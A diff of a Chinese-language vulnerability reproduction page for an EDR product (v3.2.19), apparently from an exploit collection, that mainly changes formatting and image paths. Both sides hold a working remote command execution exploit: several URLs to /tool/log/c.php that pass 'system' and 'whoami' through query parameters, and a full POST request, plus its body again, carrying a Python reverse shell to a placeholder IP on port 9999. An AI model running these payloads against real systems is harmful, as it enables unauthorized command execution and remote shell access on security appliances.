@@ -14,24 +14,18 @@ EDR v3.2.19
 
 ## 漏洞复现
 
-```plain
+```
 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami
 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami
 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami
 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami
 ```
 
-
-
-![img](images/202202091913721.png)
-
-
+![img](../.gitbook/assets/202202091913721.png)
 
 **反弹shell**
 
-
-
-```plain
+```
 POST /tool/log/c.php HTTP/1.1
 Host: x.x.x.x
 Upgrade-Insecure-Requests: 1
@@ -43,12 +37,8 @@ Content-Length: 256
 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+向 **/tool/log/c.php** POST以下数据即可
 
-
-向 **/tool/log/c.php**  POST以下数据即可
-
-
-
-```plain
+```
 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
